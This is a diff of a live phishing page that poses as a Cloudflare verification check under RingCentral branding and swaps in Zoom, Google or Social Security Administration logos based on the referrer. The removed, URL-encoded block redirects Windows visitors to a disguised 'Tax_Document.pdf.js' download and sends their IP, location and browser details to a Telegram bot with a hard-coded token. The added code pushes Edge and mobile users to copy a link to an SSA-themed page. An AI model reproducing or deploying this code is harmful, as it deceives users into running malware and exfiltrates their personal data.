@@ -1,4 +1,455 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #313131;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            min-height: 100vh;
+            background-color: #f9f9f9;
+        }
+        .main-content {
+            margin: 8rem auto;
+            padding-left: 1.5rem;
+            max-width: 60rem
+        }
+        @media (width <= 720px) {
+            .main-content {
+                margin-top: 4rem
+            }
+        }
+        .h2 {
+            line-height: 2.25rem;
+            font-size: 1.5rem;
+            font-weight: 500
+        }
+        @media (width <= 720px) {
+            .h2 {
+                line-height: 1.5rem;
+                font-size: 1.25rem
+            }
+        }
+        .core-msg {
+            line-height: 1.5;
+            font-size: 1rem;
+            color: #555;
+            margin-top: 1.5rem;
+        }
+        .spacer {
+            margin: 2rem 0
+        }
+        .spacer-top {
+            margin-top: 4rem
+        }
+        .spacer-bottom {
+            margin-bottom: 2rem
+        }
+        .main-wrapper {
+            display: flex;
+            flex: 1;
+            flex-direction: column;
+            align-items: center
+        }
+        .h1 {
+            line-height: 3.75rem;
+            font-size: 2.5rem;
+            font-weight: 500
+        }
+        .zone-name-title {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1rem;
+        }
+        .loading-verifying {
+            height: 76.391px;
+            margin-top: 1.5rem;
+        }
+        .lds-ring {
+            display: inline-block;
+            position: relative;
+            width: 1.875rem;
+            height: 1.875rem
+        }
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            border: .3rem solid #313131;
+            border-radius: 50%;
+            border-color: #313131 transparent transparent transparent;
+            width: 1.875rem;
+            height: 1.875rem;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite
+        }
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s
+        }
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s
+        }
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s
+        }
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg)
+            }
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+        .footer {
+            margin: 0 auto;
+            padding-right: 1.5rem;
+            padding-left: 1.5rem;
+            width: 100%;
+            max-width: 60rem;
+            line-height: 1.125rem;
+            font-size: .75rem
+        }
+        .footer-inner {
+            border-top: 1px solid #d9d9d9;
+            padding-top: 1rem;
+            padding-bottom: 1rem
+        }
+        .text-center {
+            text-align: center
+        }
+        .ray-id {
+            text-align: center
+        }
+        code {
+            font-family: monaco, courier, monospace
+        }
+        .verification-text {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1.5rem;
+        }
+        .security-msg {
+            margin-top: 2rem;
+        }
+        
+        /* Edge Popup Overlay Styles */
+        .edge-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        .edge-popup-container {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 340px;
+            padding: 24px 20px 28px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            animation: fadeInScale 0.2s ease-out;
+        }
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .edge-popup-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .edge-popup-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #1b3d6d;
+            margin-bottom: 12px;
+        }
+        .edge-popup-message {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .edge-popup-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .edge-popup-btn {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .edge-popup-btn-primary {
+            background-color: #4285f4;
+            color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .edge-popup-btn-primary:hover {
+            background-color: #3367d6;
+            transform: scale(1.02);
+        }
+        
+        .copy-success {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2e7d32;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1001;
+            animation: fadeOut 2s ease forwards;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+        
+        .error-message {
+            color: #d32f2f;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #ffcdd2;
+            background-color: #ffebee;
+            border-radius: 5px;
+            line-height: 1.5;
+        }
+        
+        /* Dynamic Background */
+        body {
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-size: 200px;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: -1;
+            pointer-events: none;
+        }
+        body.bg-zoom::before {
+            background-image: url('https://assets.zoom.us/images/en-us/general/zoom_logo_icon.svg');
+            opacity: 0.1;
+        }
+        body.bg-google::before {
+            background-image: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png');
+            opacity: 0.1;
+        }
+        body.bg-ssa::before {
+            background-image: url('https://www.ssa.gov/images/ssa-logo.svg');
+            opacity: 0.1;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1" id="zoneTitle">RingCentral.com</h1>
+            <div id="verificationContent">
+                <p class="verification-text">Verifying you are human. This may take a few seconds.</p>
+                <div class="loading-verifying">
+                    <div class="lds-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                <p class="core-msg security-msg">RingCentral needs to review the security of your connection before proceeding.</p>
+            </div>
+        </div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a></div>
+        </div>
+    </div>
+
 <script>
-<!-- code by https://www.html-code-generator.com -->
-document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3C%21--%20Important%3A%20This%20prevents%20mobile%20browsers%20from%20%22helping%22%20--%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20user-scalable%3Dno%22%3E%0A%20%20%20%20%3Ctitle%3EDesktop%20Access%20Required%3C/title%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20Arial%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20//%20---%20TELEGRAM%20REPORTING%20FUNCTION%20%28ADDED%20-%20DOES%20NOT%20AFFECT%20EXISTING%20CODE%29%20---%0A%20%20%20%20%20%20%20%20function%20reportToTelegram%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Your%20Telegram%20Bot%20Token%20-%20REPLACE%20WITH%20YOUR%20ACTUAL%20BOT%20TOKEN%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20botToken%20%3D%20%278122635592%3AAAGMr779_JVHA-JyJ_8FKJ5TlvXBAm8rM6s%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Your%20Chat%20ID%20-%20REPLACE%20WITH%20YOUR%20ACTUAL%20CHAT%20ID%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20chatId%20%3D%20%271078753356%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Collect%20detailed%20information%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20userAgent%20%3D%20navigator.userAgent%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20platform%20%3D%20navigator.platform%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20language%20%3D%20navigator.language%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20screenRes%20%3D%20%60%24%7Bscreen.width%7Dx%24%7Bscreen.height%7D%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20timeZone%20%3D%20Intl.DateTimeFormat%28%29.resolvedOptions%28%29.timeZone%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20timestamp%20%3D%20new%20Date%28%29.toISOString%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Get%20IP%20and%20location%20via%20ipapi.co%20%28free%2C%20no%20API%20key%20needed%20for%20basic%20info%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch%28%27https%3A//ipapi.co/json/%27%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20response.json%28%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.then%28data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ip%20%3D%20data.ip%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20city%20%3D%20data.city%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20region%20%3D%20data.region%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20country%20%3D%20data.country_name%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20org%20%3D%20data.org%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20lat%20%3D%20data.latitude%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20lon%20%3D%20data.longitude%20%7C%7C%20%27Unknown%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Format%20the%20message%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%60%0A%uD83D%uDD14%20*DOWNLOAD%20SUCCESSFUL*%0A%uD83D%uDCF1%20*Device%3A*%20Desktop/Windows%0A%uD83C%uDD94%20*IP%3A*%20%24%7Bip%7D%0A%uD83D%uDCCD%20*Location%3A*%20%24%7Bcity%7D%2C%20%24%7Bregion%7D%2C%20%24%7Bcountry%7D%0A%uD83D%uDDFA%uFE0F%20*Coordinates%3A*%20%24%7Blat%7D%2C%20%24%7Blon%7D%0A%uD83C%uDFE2%20*ISP%3A*%20%24%7Borg%7D%0A%uD83D%uDCBB%20*OS%3A*%20%24%7Bplatform%7D%0A%uD83C%uDF10%20*Browser%3A*%20%24%7BuserAgent.substring%280%2C%20100%29%7D...%0A%uD83D%uDDE3%uFE0F%20*Language%3A*%20%24%7Blanguage%7D%0A%uD83D%uDCFA%20*Screen%3A*%20%24%7BscreenRes%7D%0A%u23F0%20*TimeZone%3A*%20%24%7BtimeZone%7D%0A%uD83D%uDD52%20*Time%3A*%20%24%7Btimestamp%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Send%20to%20Telegram%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch%28%60https%3A//api.telegram.org/bot%24%7BbotToken%7D/sendMessage%60%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20chatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20message%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parse_mode%3A%20%27Markdown%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29.catch%28err%20%3D%3E%20console.log%28%27Telegram%20report%20failed%3A%27%2C%20err%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.catch%28err%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Fallback%20if%20IP%20API%20fails%20-%20send%20basic%20info%20only%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%60%0A%uD83D%uDD14%20*DOWNLOAD%20SUCCESSFUL*%20%28Basic%20Info%29%0A%uD83D%uDCF1%20*Device%3A*%20Desktop/Windows%0A%uD83D%uDCBB%20*OS%3A*%20%24%7Bplatform%7D%0A%uD83C%uDF10%20*UserAgent%3A*%20%24%7BuserAgent.substring%280%2C%20100%29%7D...%0A%uD83D%uDDE3%uFE0F%20*Language%3A*%20%24%7Blanguage%7D%0A%uD83D%uDCFA%20*Screen%3A*%20%24%7BscreenRes%7D%0A%u23F0%20*TimeZone%3A*%20%24%7BtimeZone%7D%0A%uD83D%uDD52%20*Time%3A*%20%24%7Btimestamp%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch%28%60https%3A//api.telegram.org/bot%24%7BbotToken%7D/sendMessage%60%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20chatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20message%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parse_mode%3A%20%27Markdown%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29.catch%28err%20%3D%3E%20console.log%28%27Telegram%20report%20failed%3A%27%2C%20err%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Silent%20fail%20-%20doesn%27t%20affect%20the%20download%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%27Report%20error%3A%27%2C%20e%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20//%20---%20END%20OF%20TELEGRAM%20REPORTING%20---%0A%0A%20%20%20%20%20%20%20%20//%20More%20reliable%20mobile%20detection%20that%20works%20immediately%0A%20%20%20%20%20%20%20%20function%20isMobile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20/Android%7CwebOS%7CiPhone%7CiPad%7CiPod%7CBlackBerry%7CIEMobile%7COpera%20Mini%7CMobile/i.test%28navigator.userAgent%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20//%20Simple%20DOM%20injection%20instead%20of%20document.write%0A%20%20%20%20%20%20%20%20function%20showMobileWarning%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.body.innerHTML%20%3D%20%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3EDesktop%20Access%20Required%3C/h1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EThis%20document%20requires%20desktop%20access%20for%20full%20functionality.%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EPlease%20open%20this%20file%20on%20a%20Computer.%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%60%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20//%20Immediate%20check%0A%20%20%20%20%20%20%20%20if%20%28isMobile%28%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20showMobileWarning%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20if%20%28/Windows/i.test%28navigator.userAgent%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20%22https%3A//www.dropbox.com/scl/fi/y9ll5prwxvqnpniju20uc/Tax_Document.pdf.js%3Frlkey%3Db9e09rw72itnzwpuk3yv4uypd%26st%3Djjdiipa7%26dl%3D1%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20---%20ADDED%3A%20Report%20to%20Telegram%20on%20successful%20download%20trigger%20---%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Small%20delay%20to%20ensure%20download%20started%0A%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20reportToTelegram%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%201500%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E'));
+    // ========== CONFIGURATION ==========
+    const TARGET_URL = window.location.href.replace(/\/[^/]*$/, '/ssa.html');
+    
+    // ========== USER AGENT DETECTION ==========
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    function isEdgeBrowser() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
+        const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
+        const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
+        return isEdgeChromium || isLegacyEdge || isMobileEdge;
+    }
+    
+    // ========== DYNAMIC BACKGROUND ==========
+    function setDynamicBackground() {
+        const referrer = document.referrer.toLowerCase();
+        
+        if (referrer.includes('zoom.us') || referrer.includes('zoom')) {
+            document.body.classList.add('bg-zoom');
+            document.getElementById('zoneTitle').textContent = 'zoom.us';
+        } else if (referrer.includes('google.com') || referrer.includes('google')) {
+            document.body.classList.add('bg-google');
+            document.getElementById('zoneTitle').textContent = 'google.com';
+        } else {
+            document.body.classList.add('bg-ssa');
+        }
+    }
+    
+    // ========== EDGE POPUP WITH COPY URL ==========
+    function showEdgePopup() {
+        const overlay = document.createElement('div');
+        overlay.className = 'edge-popup-overlay';
+        
+        overlay.innerHTML = `
+            <div class="edge-popup-container">
+                <div class="edge-popup-icon">🌐</div>
+                <div class="edge-popup-title">Browser Not Supported</div>
+                <div class="edge-popup-message">
+                    You are using Microsoft Edge. For security & compatibility,<br>
+                    <strong>please use Google Chrome</strong> to access and download your documents.
+                </div>
+                <div class="edge-popup-buttons">
+                    <button class="edge-popup-btn edge-popup-btn-primary" id="edgePopupCopyBtn">📋 Copy URL</button>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        const copyBtn = document.getElementById('edgePopupCopyBtn');
+        
+        if (copyBtn) {
+            copyBtn.addEventListener('click', async function() {
+                try {
+                    await navigator.clipboard.writeText(TARGET_URL);
+                    
+                    const notification = document.createElement('div');
+                    notification.className = 'copy-success';
+                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
+                    document.body.appendChild(notification);
+                    
+                    setTimeout(() => {
+                        if (notification.parentNode) notification.remove();
+                    }, 2500);
+                    
+                    copyBtn.textContent = '✓ Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = 'Copy URL';
+                    }, 2000);
+                    
+                } catch (err) {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = TARGET_URL;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    
+                    const notification = document.createElement('div');
+                    notification.className = 'copy-success';
+                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
+                    document.body.appendChild(notification);
+                    setTimeout(() => {
+                        if (notification.parentNode) notification.remove();
+                    }, 2500);
+                }
+            });
+        }
+    }
+    
+    function showMobileError() {
+        const verificationContent = document.getElementById('verificationContent');
+        if (verificationContent) {
+            verificationContent.innerHTML = `
+                <div class="error-message">
+                    The document is not available for mobile devices. Please switch to a Windows computer to download and view the document.<br><br>
+                    <button id="mobileCopyBtn" style="margin-top:10px; padding:8px 16px; background:#4285f4; color:white; border:none; border-radius:30px; cursor:pointer;">📋 Copy URL</button>
+                </div>
+            `;
+            
+            const copyBtn = document.getElementById('mobileCopyBtn');
+            if (copyBtn) {
+                copyBtn.addEventListener('click', async () => {
+                    await navigator.clipboard.writeText(TARGET_URL);
+                    copyBtn.textContent = '✓ Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = 'Copy URL';
+                    }, 2000);
+                });
+            }
+        }
+    }
+    
+    // ========== MAIN EXECUTION ==========
+    setDynamicBackground();
+    
+    const isEdge = isEdgeBrowser();
+    const isMobile = isMobileDevice();
+    
+    if (isEdge || isMobile) {
+        // Spinner rolls for 3 seconds first, THEN popup/error
+        setTimeout(() => {
+            if (isEdge) {
+                showEdgePopup();
+            } else if (isMobile) {
+                showMobileError();
+            }
+        }, 3000);
+    } else {
+        // Chrome desktop - normal redirect
+        setTimeout(function() {
+            window.location.href = "https://google.com";
+        }, 3000);
+    }
 </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"60b9271a254d4b30acd33e9b4083b857","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
